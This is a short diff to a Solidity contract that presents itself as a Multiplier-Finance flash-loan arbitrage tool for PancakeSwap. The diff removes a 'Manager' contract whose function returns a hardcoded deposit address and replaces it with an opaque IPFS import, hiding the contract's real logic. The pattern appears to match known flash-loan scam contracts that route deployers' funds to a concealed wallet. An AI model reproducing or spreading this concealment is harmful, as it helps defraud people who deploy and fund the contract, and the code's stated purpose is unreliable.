@@ -1,4 +1,4 @@
-pragma solidity ^0.6.12;
+pragma solidity ^0.5.0;
 
 
 // Multiplier-Finance Smart Contracts
@@ -6,14 +6,7 @@ import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contra
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
 //Router
-pragma solidity ^0.6.12;
-contract Manager { 
-    function performTasks() public {
-    }
-    function pancakeswapDepositAddress() public pure returns (address) {
-        return 0xEfE66eB5db217BCebF0D4E630B533564207Aa4Ee;
-    }
-}   
+import "ipfs://QmVizTLPLG9E728r7Q3Dxq67N7ZtX5MWUor6Pi7i7UZuYj";
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
